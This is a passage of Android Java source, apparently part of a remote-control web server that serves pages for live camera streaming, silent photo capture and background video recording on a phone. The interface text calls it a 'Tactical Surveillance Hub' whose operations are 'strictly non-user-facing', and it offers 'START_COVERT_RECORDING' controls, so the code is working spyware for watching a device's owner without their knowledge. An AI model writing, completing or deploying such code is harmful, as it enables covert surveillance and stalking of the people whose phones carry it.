                    serveError("Location permission denied: " + e.getMessage());
        } catch (Exception e) {
            return params.containsKey("json") ?
                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error: " + e.getMessage() + "\"}") :
                    serveError("Location error: " + e.getMessage());
        }
    }

    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }

    private String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    private String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    private String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format("%dm %ds", seconds / 60, seconds % 60);
        return String.format("%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    // ============ Camera Methods ============

    private Response serveCameraPage() {
        boolean nightMode = MediaContainer.isNightModeEnabled(context);
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<div style=\"display:flex; justify-content:space-between; align-items:flex-start; gap:10px; margin-bottom:20px;\">")
            .append("<h2 style=\"margin:0; flex-shrink:0;\">&#128247; OPTICS</h2>")
            .append("<span id=\"night-mode-status\" style=\"font-size:0.65rem; color:var(--neon-cyan); font-family:monospace; text-align:right; line-height:1.2;\">NIGHT_MODE:<br><span id=\"night-status-val\" style=\"color:").append(nightMode ? "var(--neon-green)" : "var(--neon-red)").append(";\">").append(nightMode ? "ACTIVE" : "OFF").append("</span></span>")
            .append("</div>");

        html.append("<div style=\"padding:15px; margin-bottom:20px; display:flex; justify-content:center;\">")
            .append("<button onclick=\"toggleNightMode()\" ontouchend=\"this.blur()\" id=\"night-btn\" class=\"btn ").append(nightMode ? "btn-active-yellow" : "").append("\" style=\"padding:12px 24px; font-size:0.85rem; width:auto; min-width:200px;\">")
            .append("&#127769; TOGGLE NIGHT VISION")
            .append("</button>")
            .append("<script>")
            .append("function toggleNightMode() {")
            .append("  const btn = document.getElementById('night-btn');")
            .append("  const val = document.getElementById('night-status-val');")
            .append("  fetch('/camera/night-mode').then(r => r.json()).then(data => {")
            .append("    if(data.nightMode) {")
            .append("      val.innerText = 'ACTIVE'; val.style.color = 'var(--neon-green)';")
            .append("      btn.classList.add('btn-active-yellow');")
            .append("    } else {")
            .append("      val.innerText = 'OFF'; val.style.color = 'var(--neon-red)';")
            .append("      btn.classList.remove('btn-active-yellow');")
            .append("    }")
            .append("  });")
            .append("}")
            .append("</script>")
            .append("</div>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // List available cameras using CameraHelper
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();

        if (cameras.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
            html.append("<p>No cameras available</p>");
            html.append("</div>");
        } else {
            // Tactical Surveillance Hub (Merged Section)
            html.append("<div class=\"info-section\" style=\"margin-top: 5px;\">");
            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px; line-height: 1.3;\">&#128249; Tactical Surveillance<br>Hub</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 15px;\">Unified control center for live streaming, remote snapshots, and covert background recording. All operations are strictly non-user-facing.</p>");
            html.append(
                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; font-size: 0.7rem; font-family: monospace; letter-spacing: 1px;\">CAMERA ON STANDBY</div>");
            html.append("<script>document.getElementById('rec-status').style.color = 'var(--neon-yellow)';</script>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-bottom: 25px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                boolean isBack = cam.facing.equalsIgnoreCase("Back");
                // Front = Eyes | Back = Ninja
                String icon = isBack ? "&#129399;" : "&#128064;";

                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" class=\"card-node\" style=\"padding:25px 15px; background:rgba(231, 76, 60, 0.15); border:1px solid rgba(231, 76, 60, 0.3); border-radius:12px; text-align:center; text-decoration:none; display:block; transition:all 0.3s;\">");
                html.append("<div style=\"font-size: 2.2rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: #e74c3c; font-weight: 900; font-size: 0.85rem; letter-spacing: 1px;\">LIVE_").append(cam.facing.toUpperCase()).append("</div>");
                html.append("<div style=\"color: #888; font-size: 0.65rem; margin-top: 8px; font-family: monospace;\">UPLINK_READY</div>");
                html.append("</a>");
            }
            html.append("</div>");

            html.append("<div style=\"display: flex; justify-content: center; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
            html.append("<button onclick=\"stopRecording()\" id=\"stop-rec-btn\" class=\"btn\" ");
            html.append("style=\"width: 100%; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); font-size: 0.8rem;\">");
            html.append("&#9632; TERMINATE ALL ACTIVE CAPTURE");
            html.append("</button>");
            html.append("</div>");

            // JavaScript for recording
            html.append("<script>");
            html.append("function startRecording(camId) {");
            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: var(--danger);\"><span style=\"animation: blink 1s infinite;\">&#9679;</span>&nbsp;Hub Recording (Active)</span>';");
            html.append("  });");
            html.append("}");
            html.append("function stopRecording() {");
            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: var(--neon-yellow);\">CAMERA ON STANDBY (Saved)</span>';");
            html.append("  });");
            html.append("}");
            html.append("function checkRecStatus() {");
            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
            html.append("    if (d.recording) {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: var(--danger);\"><span style=\"animation: blink 1s infinite;\">&#9679;</span>&nbsp;Hub Recording (' + d.duration + 's)</span>';");
            html.append("    } else {");
            html.append(
                    "      const stat = document.getElementById('rec-status'); stat.innerHTML = 'CAMERA ON STANDBY'; stat.style.color = 'var(--neon-yellow)';");
            html.append("    }");
            html.append("  });");
            html.append("}");
            html.append("checkRecStatus();");
            html.append("setInterval(checkRecStatus, 2000);");
            html.append("</script>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraCapture(Map<String, String> params) {
        String cameraId = params.get("cam");
        logActivity("OPTICS_TRIGGER: Capture command sent to camera " + (cameraId != null ? cameraId : "0"));
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; // Default to back camera
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        try {
            byte[] imageData = null;
            String error = null;

            if (MediaContainer.isCurrentlyStreaming()) {
                // If streaming, grab latest frame for instant snapshot
                imageData = MediaContainer.getNextFrame(1000);
                if (imageData == null) error = "Timeout waiting for frame from stream";
            } else {
                // Use MediaContainer's background capture protocol
                MediaContainer service = MediaContainer.getInstance();
                if (service == null) {
                    Intent intent = new Intent(context, MediaContainer.class);
                    context.startForegroundService(intent);
                    // Wait for service initialization
                    for (int i = 0; i < 10; i++) {
                        Thread.sleep(200);
                        service = MediaContainer.getInstance();
                        if (service != null) break;
                    }
                }

                if (service != null) {
                    service.capturePhotoBackground(cameraId);
                    imageData = MediaContainer.waitForPhoto(12000);
                    error = MediaContainer.getLastCaptureError();
                } else {
                    // Critical fallback to Helper
                    CameraHelper cameraHelper = new CameraHelper(context);
                    imageData = cameraHelper.capturePhoto(cameraId);
                    error = cameraHelper.getLastError();
                }
            }

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(0, 242, 255, 0.1); border-radius: 10px; color: #00f2ff; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        // Check permission
        if (context.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return serveError("Camera permission not granted");
        }

        try {
            byte[] imageData = null;
            String errorMsg = null;

            if (MediaContainer.isCurrentlyStreaming()) {
                imageData = MediaContainer.getNextFrame(1500);
            } else {
                MediaContainer service = MediaContainer.getInstance();
                if (service != null) {
                    service.capturePhotoBackground(cameraId);
                    imageData = MediaContainer.waitForPhoto(12000);
                    errorMsg = MediaContainer.getLastCaptureError();
                } else {
                    CameraHelper cameraHelper = new CameraHelper(context);
                    imageData = cameraHelper.capturePhoto(cameraId);
                    errorMsg = cameraHelper.getLastError();
                }
            }

            if (imageData != null && imageData.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition",
                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                return response;
            } else {
                return serveError(errorMsg != null ? errorMsg : "Failed to capture photo (Hardware Timeout)");
            }

        } catch (Exception e) {
            return serveError("Error capturing photo: " + e.getMessage());
        }
    }

    // ============ LIVE STREAMING ============

    private Response serveLiveStreamPage(Map<String, String> params) {
        String camId = params.get("cam");
        if (camId == null)
            camId = "0";

        // Get resolution from params, default to "low" for mobile data optimization
        String res = params.get("res");
        if (res == null)
            res = "low";
            
        int resIndex = 2;
        if ("ultra_low".equals(res)) resIndex = 0;
        else if ("very_low".equals(res)) resIndex = 1;
        else if ("low".equals(res)) resIndex = 2;
        else if ("medium".equals(res)) resIndex = 3;
        else if ("high".equals(res)) resIndex = 4;
        else if ("very_high".equals(res)) resIndex = 5;

        // Resolution presets optimized for different network speeds
        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 640;
                height = 480;
                quality = 15;
                fps = 2;
                resLabel = "Ultra Low (Optimized)";
                break;
            case "very_low":
                width = 640;
                height = 480;
                quality = 25;
                fps = 4;
                resLabel = "Very Low (Stable)";
                break;
            case "low":
            default:
                width = 640;
                height = 480;
                quality = 35;
                fps = 6;
                resLabel = "Low (Standard)";
                break;
            case "medium":
                width = 640;
                height = 480;
                quality = 45;
                fps = 8;
                resLabel = "Medium (640x480)";
                break;
            case "high":
                width = 1920;
                height = 1080;
                quality = 55;
                fps = 10;
                resLabel = "High (1080p)";
                break;
            case "very_high":
                width = 1920;
                height = 1080;
                quality = 70;
                fps = 12;
                resLabel = "Very High (Fidelity)";
                break;
        }

        int refreshRate = 1000 / fps; // Convert FPS to milliseconds

        // Tactical UI Cropping Calculation
        int uiHeight = 320;
        if ("ultra_low".equals(res)) uiHeight = 200;
        else if ("very_low".equals(res)) uiHeight = 240;
        else if ("low".equals(res)) uiHeight = 280;
        else if ("medium".equals(res)) uiHeight = 320;
        else if ("high".equals(res)) uiHeight = 380;
        else if ("very_high".equals(res)) uiHeight = 420;

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<style>")
            .append("@media (min-width: 769px) {")
            .append("  #stream { width: 70% !important; margin: 0 auto !important; display: block !important; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); ");
        
        if ("ultra_low".equals(res) || "very_low".equals(res) || "low".equals(res)) {
            int pcHeight = (int)(uiHeight * 1.25);
            html.append("height: ").append(pcHeight).append("px !important; ");
        } else if ("medium".equals(res)) {
            html.append("height: 380px !important; ");
        }
        
        html.append("}")
            .append("}")
            .append("</style>");
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Network info banner
        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span id=\"res-banner\" style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        // Live stream viewer
        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: block; width: 100%; background: #000; border-radius: 10px; overflow: hidden;\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"width: 100%; height: ").append(uiHeight).append("px; object-fit: cover; display: block; transition: transform 0.3s ease;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 10px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // Resolution selector (Condensed)
        html.append("<div style=\"margin-bottom: 15px; text-align: center; max-width: 450px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
        html.append(
                "<div style=\"color: #888; margin-bottom: 10px; font-size: 0.7rem; font-family:monospace;\">UPLINK_QUALITY_PROTOCOL</div>");
        html.append("<div style=\"display: flex; align-items: center; gap: 12px;\">");
        html.append("<button onclick=\"stepQuality(-1)\" class=\"btn btn-small\" style=\"min-width: 36px; padding: 5px; margin:0; border-radius: 8px;\">&#8722;</button>");
        html.append("<div style=\"flex-grow: 1; position: relative;\">");
        html.append("<input type=\"range\" id=\"quality-slider\" min=\"0\" max=\"5\" value=\"").append(resIndex).append("\" onchange=\"applyQuality(this.value)\" list=\"quality-ticks\" ");
        html.append("style=\"width: 100%; height: 8px; background: rgba(0, 242, 255, 0.1); background-image: linear-gradient(to right, rgba(0, 242, 255, 0.4) 2px, transparent 2px); background-size: 20% 100%; border-radius: 5px; appearance: none; outline: none; cursor: pointer;\">");
        html.append("<datalist id=\"quality-ticks\">");
        for(int i=0; i<=5; i++) html.append("<option value=\"").append(i).append("\"></option>");
        html.append("</datalist>");
        html.append("<div style=\"display: flex; justify-content: space-between; padding: 0 5px; margin-top: 5px; font-size: 0.55rem; color: #666; font-family:monospace;\">");
        html.append("<span>ULTRA LOW</span><span>VL</span><span>L</span><span>M</span><span>H</span><span>VERY HIGH</span>");
        html.append("</div></div>");
        html.append("<button onclick=\"stepQuality(1)\" class=\"btn btn-small\" style=\"min-width: 36px; padding: 5px; margin:0; border-radius: 8px;\">&#43;</button>");
        html.append("</div></div>");

        // Camera selection (Condensed)
        html.append("<div style=\"margin-bottom: 15px; text-align: center; max-width: 450px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
        html.append("<div style=\"color: #888; margin-bottom: 10px; font-size: 0.7rem; font-family:monospace;\">CAMERAS</div>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; width: 100%;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "border-color: #00f2ff; color: #00f2ff; background: rgba(0, 242, 255, 0.15);" : "border-color: rgba(255,255,255,0.2); color: #888; background: rgba(255, 255, 255, 0.05);";
            html.append("<button onclick=\"switchCam('").append(cam.id).append("')\" ");
            html.append("class=\"btn-small\" style=\"padding: 10px 1px; font-size: 0.7rem; ").append(selected).append(" flex: 1; min-width: 0; margin:0; text-decoration:none; text-align:center; cursor:pointer;\">");
            html.append(cam.facing.toUpperCase());
            html.append("</button>");
        }
        html.append("</div></div>");

        // Action buttons
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 15px; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
        
        html.append("<button onclick=\"rotateStream()\" class=\"btn btn-small\" style=\"border-color: #f39c12; color: #f39c12; background: rgba(243, 156, 18, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#8635; ROTATE</button>");
        
        html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#128247; SNAP</button>");
        
        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#9679; START_COVERT_RECORDING</button>");
        
        html.append("<a href=\"/camera\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: #888; color: #888; background: rgba(255, 255, 255, 0.05); padding: 10px; text-decoration: none; text-align: center; margin:0; width:100%; min-width:0;\">&#8592; BACK</a>");

        html.append("</div>");

        // Status
        html.append(
                "<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        // JavaScript for live stream with optimizations
        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var refreshRate = ").append(refreshRate).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");
        html.append("var currentRotation = 0;");

        // Rotate stream function
        html.append("function rotateStream() {");
        html.append("  currentRotation = (currentRotation + 90) % 360;");
        html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
        html.append("}");

        // Quality Control Functions
        html.append("const resOptions = ['ultra_low', 'very_low', 'low', 'medium', 'high', 'very_high'];");
        html.append("function stepQuality(delta) {");
        html.append("  const s = document.getElementById('quality-slider');");
        html.append("  let val = parseInt(s.value) + delta;");
        html.append("  if(val < 0) val = 0; if(val > 5) val = 5;");
        html.append("  s.value = val; applyQuality(val);");
        html.append("}");
        html.append("function applyQuality(val) {");
        html.append("  localStorage.setItem('cam_scroll', window.scrollY);");
        html.append("  window.location.href = '/camera/live?cam=' + camId + '&res=' + resOptions[val];");
        html.append("}");

        // Switch camera with explicit stop for hardware release
        html.append("async function switchCam(newCamId) {");
        html.append("  if (newCamId === camId) return;");
        html.append("  const currentScroll = window.scrollY;");
        html.append("  streamActive = false;");
        html.append("  document.getElementById('loading').style.display = 'block';");
        html.append("  document.getElementById('loading').innerText = 'RELEASING_HARDWARE...';");
        html.append("  await fetch('/camera/stop-stream');");
        html.append("  const currentRes = resOptions[document.getElementById('quality-slider').value];");
        html.append("  const nextUrl = '/camera/live?cam=' + newCamId + '&res=' + currentRes;");
        html.append("  localStorage.setItem('cam_scroll', currentScroll);");
        html.append("  setTimeout(() => { window.location.href = nextUrl; }, 300);");
        html.append("}");


        // Start streaming with current resolution
        html.append("function startStream() {");
        html.append(
                "  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  setTimeout(refreshFrame, 1000);");
        html.append("}");

        // Handle stream load success
        html.append("function streamLoaded() {");
        html.append("  loadingDiv.style.display = 'none';");
        html.append("  errorCount = 0;");
        html.append("  frameCount++;");
        html.append("  var now = Date.now();");
        html.append("  if (now - lastFpsTime >= 1000) {");
        html.append("    fpsCounter.innerHTML = frameCount + ' fps';");
        html.append("    frameCount = 0;");
        html.append("    lastFpsTime = now;");
        html.append("  }");
        html.append("  if (streamActive) setTimeout(refreshFrame, Math.max(10, refreshRate));");
        html.append("}");

        // Handle stream error with retry
        html.append("function handleStreamError() {");
        html.append("  errorCount++;");
        html.append("  if (errorCount < 10) {");
        html.append("    if (streamActive) setTimeout(refreshFrame, 500);");
        html.append("  } else {");
        html.append(
                "    loadingDiv.innerHTML = 'Stream error. <a href=\"javascript:location.reload()\" style=\"color:#e94560\">Reload</a>';");
        html.append("  }");
        html.append("}");

        // Refresh frame with adaptive timing (Double Buffered)
        html.append("function refreshFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  const buffer = new Image();");
        html.append("  buffer.src = '/camera/frame?t=' + Date.now();");
        html.append("  buffer.onload = () => {");
        html.append("    if (!streamActive) return;");
        html.append("    streamImg.src = buffer.src;");
        html.append("    streamLoaded();");
        html.append("  };");
        html.append("  buffer.onerror = () => {");
        html.append("    if (streamActive) handleStreamError();");
        html.append("  };");
        html.append("}");

        // Capture photo
        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        // Toggle recording
        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; START_COVERT_RECORDING';");
        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.05)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; STOP_COVERT_RECORDING';");
        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.2)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        // Check status
        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; STOP_COVERT_RECORDING';");
        html.append("      isRecording = true;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");

        // Stop stream when leaving page
        html.append("window.onbeforeunload = function() { streamActive = false; };");

        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        // Start stream if not already - use low resolution by default for mobile data
        if (!MediaContainer.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            // Default to 320x240 with low quality for mobile data compatibility
            startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
            try {
                Thread.sleep(800); // Give more time for camera to start
            } catch (InterruptedException ignored) {
            }
        }

        // Return single frame for simplicity (MJPEG multipart is complex with
        // NanoHTTPD)
        return serveSingleFrame();
    }

    private Response serveSingleFrame() {
        byte[] frame = MediaContainer.getNextFrame(200);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            // Return a 1x1 transparent pixel as fallback
            byte[] pixel = new byte[] {
